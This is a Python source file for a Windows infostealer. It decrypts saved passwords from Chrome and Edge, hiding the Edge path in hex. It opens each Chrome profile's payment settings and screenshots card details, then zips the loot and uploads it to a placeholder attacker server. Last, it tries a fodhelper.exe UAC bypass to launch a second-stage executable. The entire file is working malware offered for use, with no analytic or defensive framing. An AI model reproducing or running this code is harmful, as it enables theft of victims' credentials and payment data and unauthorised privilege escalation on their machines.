import os, json
import time

# Configuration Variables

BASE_DIR = r"C:\ProgramData\SystemData" # Directory to store extracted data
BASE_URL = "http://IP-Address/uploads/" # Replace with your server URL
C_PATH = r"C:\Program Files\Google\Chrome\Application\chrome.exe" # Path to Chrome executable
USER_DIR = os.path.normpath(fr"{os.environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data") # Chrome User Data Directory

# Ensure BASE_DIR exists
if not os.path.exists(BASE_DIR):
    os.makedirs(BASE_DIR)

# Function Definitions __key__() to extract encrypted key from Local State file
def __key__(home_folder):
    import win32crypt, base64
    try:
        with open(os.path.normpath(home_folder + r"\Local State"), "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception:
        return None

# Function Definitions __decrypt__() to decrypt the password using the encrypted key
def __decrypt__(ciphertext, encrypted_key):
    try:
        from Crypto.Cipher import AES
        chrome_secret = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = AES.new(encrypted_key, AES.MODE_GCM, chrome_secret)
        return cipher.decrypt(encrypted_password).decode()
    except Exception:
        return

# Function Definitions __db__() to copy and connect to the Login Data SQLite database
def __db__(login_data_path):
    try:
        import sqlite3, shutil
        shutil.copy2(login_data_path, "C:\\ProgramData\\login_data_copy.db")
        return sqlite3.connect("C:\\ProgramData\\login_data_copy.db")
    except Exception:
        return None

# Function Definitions __ch_get__() to extract and decrypt passwords from Chrome/Edge
def __ch_get__(user_data, browser_name):
    import re
    try:
        if (os.path.exists(user_data) and os.path.exists(user_data + r"\Local State")):
            encrypted_key = __key__(user_data)
            folders = [item for item in os.listdir(user_data) if re.search("^Profile*|^Default$",item)!=None]
            for folder in folders:
                login_data_path = os.path.normpath(fr"{user_data}\{folder}\Login Data")
                db = __db__(login_data_path)
                if(encrypted_key and db):
                    cursor = db.cursor()
                    cursor.execute("select action_url, username_value, password_value from logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if (url!="" and username!="" and ciphertext!=""):
                            decrypted_pass = __decrypt__(ciphertext, encrypted_key)
                            with open(f"{BASE_DIR}\\_passwords.txt", "a", encoding="utf-8") as f:
                                f.write(str(index)+" "+("="*50)+f"\nBrowser Name: {browser_name}\nURL: {url}\nUsername: {username}\nPassword: {decrypted_pass}\n")
                    cursor.close()
                db.close()
                os.remove("C:\\ProgramData\\login_data_copy.db")
    except Exception:
        ...

# Main Functions __pss_main__() to initiate password extraction from Chrome and Edge
def __pss_main__():
    try:
        __ch_get__(USER_DIR, "Google Chrome")
        edge_user_data = os.path.normpath(fr"{os.environ['USERPROFILE']}{bytes.fromhex('5c417070446174615c4c6f63616c5c4d6963726f736f66745c456467655c557365722044617461').decode()}")
        __ch_get__(edge_user_data, "Microsoft Edge")
    except Exception:
        ...

# Function Definitions __lists_profiles__() to list Chrome profiles
def __lists_profiles__():
    try:
        local_state_path = os.path.join(USER_DIR, "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            data = json.load(f)

        profile_info = data.get("profile", {})
        info_cache = profile_info.get("info_cache", {})

        profiles = []
        for folder, info in info_cache.items():
            profiles.append({
                "folder": folder,
            })
        return profiles
    except Exception:
        return

# Function Definitions __launch__() to launch Chrome with a specific profile and navigate to payment settings
def __launch__(profile_folder):
    import pyautogui, subprocess
    url = "chrome://settings/payments/"
    cmd = [
        C_PATH,
        f'--profile-directory={profile_folder}',
        f'--user-data-dir={USER_DIR}',
    ]
    subprocess.Popen(cmd)
    time.sleep(2)
    pyautogui.hotkey('ctrl', 'l')
    time.sleep(1)
    pyautogui.typewrite(url)
    pyautogui.press('enter')

# Function Definitions __click__() to interact with the Chrome UI and take a screenshot
def __click__():
    time.sleep(1)

    try:
        import pyautogui
        menu_icon = pyautogui.locateCenterOnScreen("icon_more_vert.png", confidence=0.8)

        if menu_icon:
            pyautogui.click(menu_icon)
        else:
            pyautogui.click(1220, 640)

        time.sleep(1)
        
        edit_btn = pyautogui.locateCenterOnScreen("edit.png", confidence=0.8)

        if edit_btn:
            pyautogui.click(edit_btn)
        else:
            pyautogui.click(1280, 680)
        pyautogui.screenshot(f"{BASE_DIR}\\{int(time.time())}.png")
    except Exception:
        ...
    os.system("taskkill /IM chrome.exe /F")

# Main Function __py_main__() to manage profile processing and data extraction
def __py_main__():
    try:
        profiles = __lists_profiles__()

        for profile in profiles:
            __launch__(profile["folder"])
            __click__()
    except Exception:
        ...

# Function Definitions __zip_folder__() to zip the extracted data folder
def __zip_folder__(folder_path, zip_path):
    import zipfile
    BASE = "C:\\ProgramData\\"
    with zipfile.ZipFile(BASE+zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, folder_path)
                zipf.write(file_path, arcname)
    return BASE+zip_path

# Function Definitions __upload__() to upload the zipped data to the server
def __upload__(filepath):
    filename = os.path.basename(filepath)
    url = BASE_URL + filename
    import requests

    try:
        with open(filepath, "rb") as f:
            r = requests.put(url, data=f)

        if r.status_code in (200, 201, 204):
            os.remove(filepath)
    except Exception:
        ...

# Function Definitions is_admin() to check if the script is running with admin privileges
def is_admin():
    import ctypes
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Function Definitions silent_uac_bypass() to silently bypass UAC using fodhelper.exe
def silent_uac_bypass():
    import winreg, subprocess
    try:
        key_path = r"Software\Classes\ms-settings\shell\open\command"
        path = os.path.join(os.getcwd(),"second.exe") # Path to the second stage executable
        
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, path)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
        except Exception:
            return False
        
        try:
            subprocess.Popen("fodhelper.exe", shell=True)
            time.sleep(5)
        except Exception:
            return False
        
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        except Exception:
            ...
        return True
    except Exception:
        return False

# Execution Flow
if __name__ == "__main__":
    __pss_main__() # Extract passwords
    __py_main__() # Extract payment info
    import datetime
    __upload__(filepath=__zip_folder__(BASE_DIR, f"exfil_data_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")) # Zip and upload data
    silent_uac_bypass() if not is_admin() else None # Attempt UAC bypass if not admin